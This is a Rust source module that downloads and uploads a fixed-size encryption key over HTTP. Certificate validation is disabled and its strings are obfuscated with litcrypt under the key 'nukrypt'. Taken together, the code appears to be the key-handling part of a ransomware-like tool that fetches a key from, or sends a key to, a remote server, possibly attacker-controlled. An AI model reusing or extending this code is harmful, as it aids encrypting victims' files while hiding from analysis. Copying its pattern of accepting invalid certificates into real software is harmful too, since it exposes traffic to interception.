use std::io::{Read, Error,ErrorKind};

use crate::crypto::SIZE_KEY;

use reqwest::blocking::{Client, Response};
use litcrypt::{use_litcrypt, lc};


use_litcrypt!("nukrypt");


pub fn download_key(url: &str) -> Result<[u8; SIZE_KEY], Error> {
    let mut data = [0u8; SIZE_KEY];
    let mut response: Response;

    match Client::builder()
            .danger_accept_invalid_certs(true).build().unwrap().get(url).send() {

        Ok(r) => {
            response = r;

            if ! response.status().is_success() {
                return Err(Error::new(
                    ErrorKind::Other, lc!("HTTP GET request failed")
                ))
            }

            if response.read(&mut data)? != SIZE_KEY {
                return Err(Error::new(
                    ErrorKind::InvalidData, lc!("Unexpected key length")
                ));
            };
        },
        Err(e) => {
            return Err(Error::new(ErrorKind::Other, e.to_string()))
        }
    };

    Ok(data)
}

pub fn upload_key(url: &str, key: &[u8; SIZE_KEY]) -> Result<bool, Error> {
    match Client::builder()
            .danger_accept_invalid_certs(true).build().unwrap()
            .post(url).body(key.as_slice().to_owned()).send() {

        Ok(r) => {
            if ! r.status().is_success() {
                return Err(Error::new(
                    ErrorKind::Other, lc!("HTTP POST request failed")
                ))
            }
        },
        Err(e) => {
            return Err(Error::new(ErrorKind::Other, e.to_string()))
        }
    }

    Ok(true)
}